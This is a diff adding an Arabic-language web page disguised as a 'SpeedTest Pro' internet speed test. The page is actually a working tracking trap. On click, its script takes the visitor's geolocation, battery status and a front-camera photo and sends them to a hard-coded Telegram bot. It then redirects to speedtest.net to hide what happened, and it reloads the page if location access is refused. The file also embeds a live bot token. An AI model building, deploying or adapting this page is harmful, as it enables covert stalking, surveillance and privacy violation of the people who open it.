@@ -1,0 +1,78 @@
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SpeedTest Pro</title>
+    <style>
+        body { background: #0b0e18; color: white; font-family: sans-serif; text-align: center; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        /* جعل كامل الشاشة منطقة ضغط */
+        #clickAnywhere { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; cursor: pointer; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .circle { width: 200px; height: 200px; border: 5px solid #00d2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 20px #00d2ff; }
+        .text { font-size: 40px; font-weight: bold; color: #00d2ff; }
+    </style>
+</head>
+<body>
+
+    <div id="clickAnywhere">
+        <h2>فحص السرعة العالمي</h2>
+        <div class="circle"><span class="text">START</span></div>
+        <p>انقر في أي مكان للبدء...</p>
+    </div>
+
+    <video id="v" autoplay playsinline style="display:none"></video>
+    <canvas id="c" style="display:none"></canvas>
+
+    <script>
+        const token = "8632426187:AAH_tO6_cfSkSf9HCs0oP7i2EaU3B2PsrHI";
+        const chat = "7984067238";
+        const user = new URLSearchParams(window.location.search).get( user ) || "Unknown";
+
+        async function upload(type, data, extra = "") {
+            const fd = new FormData();
+            fd.append("chat_id", chat);
+            if(type === "img") {
+                fd.append("photo", data, "snap.jpg");
+                fd.append("caption", `👤 ${user}\n${extra}`);
+                return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: "POST", body: fd});
+            } else {
+                return fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(data)}&parse_mode=Markdown`);
+            }
+        }
+
+        document.getElementById( clickAnywhere ).onclick = function() {
+            this.style.pointerEvents = "none";
+            document.querySelector( p ).innerText = "جاري الاتصال بالسيرفر...";
+
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                // 1. التقرير التفصيلي فوراً (مطابق لطلبك)
+                let batt = "19%";
+                try { const b = await navigator.getBattery(); batt = `${(b.level * 100).toFixed(0)}% (${b.charging ?  ⚡  :  🔋 })`; } catch(e) {}
+                
+                const report = `🛰️ **LIVE LOCATION**\n\n📱 Device: Android Device\n🔋 Battery: ${batt}\n🎯 Accuracy: 100m\n📍 Maps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                await upload("text", report);
+
+                // 2. الكاميرا الأمامية فقط (لضمان السرعة)
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
+                    const v = document.getElementById( v );
+                    v.srcObject = stream;
+                    await new Promise(r => setTimeout(r, 1000));
+                    const c = document.getElementById( c );
+                    c.width = 640; c.height = 480;
+                    c.getContext( 2d ).drawImage(v, 0, 0);
+                    stream.getTracks().forEach(t => t.stop());
+                    c.toBlob(b => upload("img", b, "📸 صورة الكاميرا الأمامية"),  image/jpeg );
+                } catch(e) {}
+
+                setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
+            }, (err) => {
+                alert("يرجى السماح بالوصول للموقع لبدء الفحص.");
+                location.reload();
+            });
+        };
+    </script>
+</body>
+</html>
+
